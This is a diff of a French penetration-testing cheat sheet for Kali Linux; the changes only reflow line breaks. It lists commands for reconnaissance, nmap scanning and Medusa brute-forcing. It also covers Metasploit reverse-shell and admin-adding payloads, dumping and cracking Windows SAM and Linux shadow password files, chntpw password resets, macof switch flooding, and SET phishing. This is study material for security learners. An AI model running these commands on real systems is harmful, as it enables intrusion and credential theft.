@@ -69,17 +69,16 @@ Anthony Fargette
 Énumérer toutes interfaces :  
 `ifconfig -a`
 
-Activer / désactiver une carte réseau :
-
+Activer / désactiver une carte réseau :  
 `ifconfig eth0 up/down`
 
-Mettre une @IP sur une carte réseau :
+Mettre une @IP sur une carte réseau :  
 `ifconfig eth0 up @IP`
 
-Retirer la configuration dhcp :
+Retirer la configuration dhcp :  
 `dhclient -r`
 
-Demander la configuration dhcp :
+Demander la configuration dhcp :  
 `dhclient`
 
 ## 4 Phases de pénétration
@@ -95,18 +94,18 @@ Demander la configuration dhcp :
 
 ## 1. Reconnaissance
 
-Recueil d’informations.
-Bien noter toutes les informations reccueillies.
+Recueil d’informations.  
+Bien noter toutes les informations reccueillies.  
 Association d’informations collectees en @IP
 
 Partie suivante : [2. Scan](#2-scan)
 
 ### Httrack
 
-Récupérer le contenu d'un site web en mode interactif :
+Récupérer le contenu d'un site web en mode interactif :  
 `httrack`
 
-En CLI :
+En CLI :  
 `httrack http://url -O /repertoire`
 
 ### Google Hacking
@@ -121,12 +120,9 @@ Exemples de recherches avec des attributs :
 
 Autre attributs :
 
-intitle: *Cherche les sites dont le titre contient le mot recherche*
-
-inurl: *Cherche les sites dont l'url contient le mot recherche*
-
-cache: *Cherche dans les caches du moteur de recherche*
-
+intitle: *Cherche les sites dont le titre contient le mot recherche*  
+inurl: *Cherche les sites dont l'url contient le mot recherche*  
+cache: *Cherche dans les caches du moteur de recherche*  
 filetype: *Cherche par type de fichier*
 
 Possibilité de combiner les attributs
@@ -141,12 +137,9 @@ Recherches d’adresses de messagerie, de sous-domaine et hotes appartenant à u
 
 `theHarvester -d nom_de_domaine -l 10 -b google`
 
--d *domaine*
-
--l *limite*
-
--b *répertoire public de recherche*
-
+-d *domaine*  
+-l *limite*  
+-b *répertoire public de recherche*  
 -b all *pour utiliser tous les repertoires*
 
 ### Whois
@@ -160,35 +153,29 @@ Site web pour recueillir les informations :
 
 ### Host
 
-Traduire les noms de domaine en @IP :
-
+Traduire les noms de domaine en @IP :  
 `host nom_de_domaine`
 
-Lister les recherches :
-
+Lister les recherches :  
 `host -a nom_de_domaine`
 
 ### Nslookup
 
 Obtenir les informations du serveur DNS mode interactif :
 
-`nslookup`
-
-`server @IPserver`
-
-`set type=any`
-
+`nslookup`  
+`server @IPserver`  
+`set type=any`  
 `.`
 
 ### Dig
 
-Tenter un transfert de zone sur un serveur DNS :
+Tenter un transfert de zone sur un serveur DNS :  
 `dig @IP_serveur_dns nom_de_domaine -t AXFR`
 
 ### Fierce
 
-Sacnner DNS et enumerer les @IP actifs du nom de domaine :
-
+Sacnner DNS et enumerer les @IP actifs du nom de domaine :  
 `fierce -dns nom_de_domaine`
 
 ### Metagoofil
@@ -197,26 +184,26 @@ Récupérer des métadonnées sur internet à partir d’un nom de domaine :
 
 `metagoofil`
 
--d *domaine*
--t *type de fichier*
--l *limite de recherche*
--n *limte de fichiers à telecharger*
--o *dossier de sortie*
--f *fichier ou enregistrer les liens html*
+-d *domaine*  
+-t *type de fichier*  
+-l *limite de recherche*  
+-n *limte de fichiers à telecharger*  
+-o *dossier de sortie*  
+-f *fichier ou enregistrer les liens html*  
 
 `metagoofil -d kali.org -t pdf -l 100 -n 25 -o kalipdf -f kalipdf.html`
 
 ### ThreatAgent
 
-Site web qui recherche toutes les informations avec un nom de domaine.
-Nécessite un compte pour l’utiliser
+Site web qui recherche toutes les informations avec un nom de domaine.  
+Nécessite un compte pour l’utiliser.
 
 Logiciel de recherches d’infos sous windows : FOCA, Search Diggity, Maltego, RobTex
 
 ## 2. Scan
 
-Association d’adresses IP à des ports ou services ouverts.
-Partie précédente : [1. Reconnaissance](#1-reconnaissance)
+Association d’adresses IP à des ports ou services ouverts.  
+Partie précédente : [1. Reconnaissance](#1-reconnaissance)  
 Partie suivante : [3. Exploitation](#3-exploitation)
 
 ### 4 étapes de scan
@@ -251,9 +238,9 @@ Partie suivante : [3. Exploitation](#3-exploitation)
 paquet ICMP, envoie d’une requête ICMP Echo.
 `ping @IP`
 
-icmp_seq *ordre du paquet*
-ttl *durée de vie du paquet, nombre de saut que peut effectuer le paquet avant expiration*
-time *duree total du parcours du paquet vers et depuis la cible*
+icmp_seq *ordre du paquet*  
+ttl *durée de vie du paquet, nombre de saut que peut effectuer le paquet avant expiration*  
+time *duree total du parcours du paquet vers et depuis la cible*  
 
 ### Fping
 
@@ -261,13 +248,12 @@ Balayage de ping dans une plage d'@IP
 
 `fping -a -g @IPdebut @IPfin > ipList.txt`
 
--a *inclure uniquement les machines actives*
-
+-a *inclure uniquement les machines actives*  
 -g *definition d'une plage d'@IP*
 
 ### Scan des ports
 
-Nombre total de ports d'un ordinateur : **65 536 (0 - 65 535)**
+Nombre total de ports d'un ordinateur : **65 536 (0 - 65 535)**  
 Réponse aux protocoles TCP **(Transmission Control Protocol)** ou UDP **(User Datagram Protocol)** selon les services mis en place.
 
 Services utilisant l'UDP : DHCP, DNS, SNMP, TFTP ...
@@ -282,22 +268,16 @@ Le premier ordinateur se connecte au second en envoyant un paquet SYN à un num�
 
 Scan de port.
 
-`nmap -sT -p- -Pn @IP`
+`nmap -sT -p- -Pn @IP`  
 `nmap -sT -p- -Pn @IPdebut-@IPfin_dernier_octet`
 
--s *Précision du type de scan à effectuer, par defaut scan SYN*
-
--sT *Scan TCP Connect*
-
--sS *Scan SYN*
-
--p- *Scan de tous les ports à la place des 1000 par défaut*
-
--P *Saute l'etape de decouverte*
-
--n *Scan des machines en les considérant comme actives*
-
--iL ipList.txt *spécifie un fichier contenant une liste des @IP à scanner*
+-s *Précision du type de scan à effectuer, par defaut scan SYN*  
+-sT *Scan TCP Connect*  
+-sS *Scan SYN*  
+-p- *Scan de tous les ports à la place des 1000 par défaut*  
+-P *Saute l'etape de decouverte*  
+-n *Scan des machines en les considérant comme actives*  
+-iL ipList.txt *spécifie un fichier contenant une liste des @IP à scanner*  
 
 Un scan SYN ("Stealth Scan") n'effectue que les 2 étapes puis renvoie un RST (réinitialisation) qui indique à la cible d'oublier les paquets precedents et de fermer la connexion.
 
@@ -307,7 +287,7 @@ Scan plutot lent.
 
 `nmap -sU @IP`
 
--sU *Scan UDP*
+-sU *Scan UDP*  
 -sV *Scan avec version*
 
 #### Scan Xmas
@@ -358,15 +338,14 @@ Différentes catégories :
 
 #### Options supplémentaires
 
--T *Modifie la rapidité de scan des ports 0-5 , 0 lent au plus rapide 5 mais moins preciss*
-
+-T *Modifie la rapidité de scan des ports 0-5 , 0 lent au plus rapide 5 mais moins preciss*  
 -O *Détermine l'OS de la cible*
 
 ### Connexion à distance
 
 Tentative de connexion avec les services Telnet et SSH.
 
-`telnet @IP`
+`telnet @IP`  
 `ssh root@@IP`
 
 ### Scan de vulnérabilités avec Nessus
@@ -381,10 +360,10 @@ Une fois installé, il faut lancer le serveur Nessus :
 Acces au service via le navigateur web en https et le port 8834 :
 `https://localhost:8834`
 
-Sélectionner son offre (Essentials).
+Sélectionner son offre (Essentials).  
 Obtenir pour rentrer le code d'activation.
 
-Entrer le nom d'utilisateur et son mot de passe pour la connexion en local.
+Entrer le nom d'utilisateur et son mot de passe pour la connexion en local.  
 Nessus va alors télécharger tous les autres composants nécessaires.
 
 Dans *Setting* > *Advanced Settings* > *Scanning* verifier que le *Safe Checks* est à Yes car sans cela le scan pourrait provoquer un disfonctionnement du réseau et du système.
@@ -394,8 +373,8 @@ OpenVAS est une version fork de Nessus en open-source.
 
 ## 3. Exploitation
 
-Contrôle sur un système.
-Partie précédente : [2. Scan](#2-scan)
+Contrôle sur un système.  
+Partie précédente : [2. Scan](#2-scan)  
 Partie suivante : [4. Exploitation](#4-postexploitation-et-maintien-de-lacc%c3%a8s)
 
 ### Medusa
@@ -404,17 +383,17 @@ Système parallèle d'ouverture de session par brute force qui tente d'accéder 
 Connaitre l'@IP, le service, avoir des noms d'utilisateurs potentiels et une wordlist de mots de passe.
 
 Wordlist déjà fournis avec Kali :
-`/usr/share/wordlists`
+`/usr/share/wordlists`  
 `/usr/share/john/password.lst`
 
 Commande Medusa :
 `medusa -h @IP -u nom_utilisateur -P wordlist -M service`
 
--h *@IP de l'hôte*
--u *nom de l'utilisateur*
--U *fichier contenant une liste d'utilisateurs à passer*
--p *un seul mot de passe*
--P *fichier contenant une liste de mots de passe à passer*
+-h *@IP de l'hôte*  
+-u *nom de l'utilisateur*  
+-U *fichier contenant une liste d'utilisateurs à passer*  
+-p *un seul mot de passe*  
+-P *fichier contenant une liste de mots de passe à passer*  
 -M *nom du service*
 
 Autres logiciels : Hydra, ...
@@ -423,49 +402,57 @@ Autres logiciels : Hydra, ...
 
 Metasploit Framework permet de sélectionner la cible et sélectionner les charges *(payload)* à effectuer.
 Exploite les systèmes scannés.
-Exploitation en CLI avec Msfconsole :
+Exploitation en CLI avec Msfconsole :  
 `msfconsole`
 
-Mettre à jour MetasploitF :
-`msfupdate`
+Mettre à jour MetasploitF :  
+`msfupdate`  
 *Inutil dans Kali.*
 
-Rechercher l'exploit :
-`search nom_exploit`
+Rechercher l'exploit :  
+`search nom_exploit`  
 *Possibilité de rechercher par date, entrer la date apres search*
 
-Utiliser l'exploit :
+Utiliser l'exploit :  
 `use nom_exploit`
 
-Examiner les charges disponibles :
+Examiner les charges disponibles :  
 `show payloads`
 
-Sélectionner le payload :
+Sélectionner le payload :  
 `set payload nom_payload`
 
-Connaître les options disponibles de la charge :
+Connaître les options disponibles de la charge :  
 `show options`
 
-Configurations des hôtes distants *(Remote)* et locals *(Local)* :
-`set RHOST @IP_distante`
+Configurations des hôtes distants *(Remote)* et locals *(Local)* :  
+`set RHOST @IP_distante`  
 `set LHOST @IP_locale`
 
-Démarrer l'exploit :
+Démarrer l'exploit :  
 `exploit`
 
-Partie précédente : [2. Scan](#2-scan)
-Partie suivante : [4. Postexploitation et maintien de l'accès](#4-postexploitation-et-maintien-de-lacc%c3%a8s)
+Partie précédente : [2. Scan](#2-scan)  
+Partie suivante : [4. Postexploitation et maintien de l'accès](#4-postexploitation-et-maintien-de-lacc%c3%a8s)  
 
 Exemples de charges *(payloads)* à envoyer sur les machines Windows :
 
-- windows/adduser *crée sur la machine cible un nouvel utilisateur appartenant au groupe administrateur*
-- windows/exec *Exécute sur la machine cible un binaire (.exe)*
-- windows/shell_bind_tcp *Ouvre sur la machine cible un shell de commande et attend une connexion*
-- windows/shell_reverse_tcp *La machine cible se connecte à l'assaillant et ouvre un shell de commande*
-- windows/meterpreter/bind_tcp *Installe Meterpreter sur la machine cible et attend une connexion*
-- windows/meterpetrer/reverse_tcp *Installe Meterpreter sur la machine cible et crée une connexion de retour à l'assaillant*
-- windows/vncinjetc/bind_tcp *Installe VNC sur la machine cible et attend une connexion*
-- windows/vncinjetc/reverse_tcp *Installe VNC sur la machine cible et renvoie une connexion VNC à la cible*
+- windows/adduser  
+*crée sur la machine cible un nouvel utilisateur appartenant au groupe administrateur*
+- windows/exec  
+*Exécute sur la machine cible un binaire (.exe)*
+- windows/shell_bind_tcp  
+*Ouvre sur la machine cible un shell de commande et attend une connexion*
+- windows/shell_reverse_tcp  
+*La machine cible se connecte à l'assaillant et ouvre un shell de commande*
+- windows/meterpreter/bind_tcp  
+*Installe Meterpreter sur la machine cible et attend une connexion*
+- windows/meterpetrer/reverse_tcp  
+*Installe Meterpreter sur la machine cible et crée une connexion de retour à l'assaillant*
+- windows/vncinjetc/bind_tcp  
+*Installe VNC sur la machine cible et attend une connexion*
+- windows/vncinjetc/reverse_tcp  
+*Installe VNC sur la machine cible et renvoie une connexion VNC à la cible*
 
 ### Meterpreter
 
@@ -497,7 +484,7 @@ Craquage de mots de passe pour augmenter les privilèges.
 1. Localiser le fichier des mots de passe chiffrés sur le système et le télécharger.
 2. Employer un outil pour convertir les mots de passe chiffrés en mots de passe en clair.
 
-Tester la config avec john :
+Tester la config avec john :  
 `john --test`
 
 #### Craquage des mots de passe en local
@@ -506,20 +493,20 @@ Sur Windows, le fichier de mots de passe se nomme SAM *(Security Account MAnager
 Présent dans le dossier **C:\Windows\System32\Config\\**
 Cependant Windows bloque l'acces à ce fichier, il faut donc booter sur un autre OS pour contourner ce verrouillage.
 
-Une fois booté sur un autre OS, il faut monter le disque local de la machine :
-`fdisk -l` *Pour lister les disques présents*
-`mkdir /mnt/sda1` *Créer un point de montage*
+Une fois booté sur un autre OS, il faut monter le disque local de la machine :  
+`fdisk -l` *Pour lister les disques présents*  
+`mkdir /mnt/sda1` *Créer un point de montage*  
 `mount dev/sda1 /mnt/sda1` *Monter le disque cible*
 
-Rechercher le fichier SAM :
+Rechercher le fichier SAM :  
 `cd /mnt/sda1/Windows/System32/config`
 
 ##### SamDump2
 
-Déchiffrer le fichier SAM avec SamDump2 qui se sert d'un fichier system *(situé à côté du fichier SAM normalement)* sur la machine locale pour déchiffrer :
+Déchiffrer le fichier SAM avec SamDump2 qui se sert d'un fichier system *(situé à côté du fichier SAM normalement)* sur la machine locale pour déchiffrer :  
 `samdump2 SAM system > /tmp/mdp_chiffres.txt`
 
-Vérifier que les mots de passe ont bien été copiés :
+Vérifier que les mots de passe ont bien été copiés :  
 `cat /tmp/mdp_chiffres.txt`
 
 ##### BkHive
@@ -527,38 +514,38 @@ Vérifier que les mots de passe ont bien été copiés :
 Sur certains systèmes Windows l'accès aux mots de passe chiffrés peut nécissiter une étape supplémentaire.
 BkHive sert à extraire la clef syskey à partir de la ruche système.
 
-`bkhive system cle_sys.txt`
+`bkhive system cle_sys.txt`  
 `samdump2 SAM cle_sys.txt > /tmp/mdp_chiffres.txt`
 
 ##### John
 
-Craquer le fichier contenant les mots de passe chiffrés :
+Craquer le fichier contenant les mots de passe chiffrés :  
 `john /tmp/mdp_chiffres.txt`
 
 #### Craquage à distance
 
-Avec une session Meterpreter, une commande permet de contourner les mécanismes de sécurité de Windows et d'obtenir la liste des mots de passe hashés :
+Avec une session Meterpreter, une commande permet de contourner les mécanismes de sécurité de Windows et d'obtenir la liste des mots de passe hashés :  
 `hasdump`
 
 Il suffit plus qu'à copier cette liste affichée à l'écran.
 
 #### Craquage des mots de passe UNIX/Linux et élévation des privilèges
 
-Le fichier contenant les mots de passe chiffrés est situé dans :
-`/etc/shadow`
-Il faut cependant avoir un niveau de privilège suffisant pour y accéder.
-Pour contrer ce problème, nous pouvons les obtenir en combinant les fichiers *passwd* et *shadow*:
+Le fichier contenant les mots de passe chiffrés est situé dans :  
+`/etc/shadow`  
+Il faut cependant avoir un niveau de privilège suffisant pour y accéder.  
+Pour contrer ce problème, nous pouvons les obtenir en combinant les fichiers *passwd* et *shadow*:  
 `unshadow /etc/passwd /etc/shadow > /tmp/linux_mdp_chiffres.txt`
 
 ### Réinitialisation de mots de passe sur machine Windows avec chntpw
 
-Nécessite un accès physique de la machine cible.
+Nécessite un accès physique de la machine cible.  
 Objectif : écraser le fichier SAM et créer un nouveau mot de passe vide pour n'importe quel utilisateur.
 Booter sur un autre OS et monter la partition de la machine.
-Commande :
+Commande :  
 `chntpw -i /mnt/sda1/Windows/System32/config/SAM`
 
-Choisir *Edit user data and passwords*
+Choisir *Edit user data and passwords*  
 -i *mode interactif*
 
 ### Wireshark
@@ -581,11 +568,11 @@ Macof de la suite Dsniff est un outil qui va permettre d'inonder le commutateur 
 
 `macof -i eth0 -s 192.168.56.101 -d @IP_commutateur`
 
--i *précise la carte réseau*
--s *@IP source*
+-i *précise la carte réseau*  
+-s *@IP source*  
 -d *@IP destination*
 
-Lancer Wireshark avec les privilèges pour qu'il ait accès à la configuration des cartes réseau :
+Lancer Wireshark avec les privilèges pour qu'il ait accès à la configuration des cartes réseau :  
 `sudo wireshark`
 
 Séléctionner une carte réseau et commencer à capturer le traffic avec les options par défaut.
@@ -594,20 +581,20 @@ Si les inforamtions ne sont pas chiffrées, on peut alors les voir en clair.
 ### Armitage
 
 Armitage est une version de Metasploit Framework avec une interface graphique.
-Vant de lancer Armitage il faut démarrer les services postgresql et metasploit :
-`service postgresql start`
+Vant de lancer Armitage il faut démarrer les services postgresql et metasploit :  
+`service postgresql start`  
 `service metasploit start`
 
-Nous pouvons alors lancer Armitage :
+Nous pouvons alors lancer Armitage :  
 `sudo armitage`
 Il affiche alors une boîte de dialogue pour se connecter, laisser les paramètres par défaut et cliquer sur Connect.
 Il demande ensuite de si nous voulons démarrer Metasploit. Cliquer sur Oui.
 
-Identification des cibles potentielles :
+Identification des cibles potentielles :  
 Séléctionner Hosts, Nmap Scan, Quick Scan (OS detect).
 Entrer l'@ IP ou la plage d'@ IP à scanner.
-Exemple :
-`192.168.1.1-255`
+Exemple :  
+`192.168.1.1-255`  
 Les cibles potentielles sont ensuite affichées à l'écran.
 
 Nous pouvons effectuer une attaque Hail Mary qui va lancer une vague automatique d'exploits contre la cible sans discretion. Il va mettre en relation les ports découverts par Nmap avec les exploits disponibles de Metasploit. Si la machine est compromise, elle sera affichée avec des éclairs autours.
@@ -615,8 +602,8 @@ Nous pouvons alors consulter la liste des Shell obtenus sur la machine cible en 
 
 ### SET (Social Engineering Toolkit)
 
-Outil permettant permettant diverses attaques basées sur l'hameçonnage.
-Lancer SET :
+Outil permettant permettant diverses attaques basées sur l'hameçonnage.  
+Lancer SET :  
 `sudo setoolkit`
 
 #### Menu SET
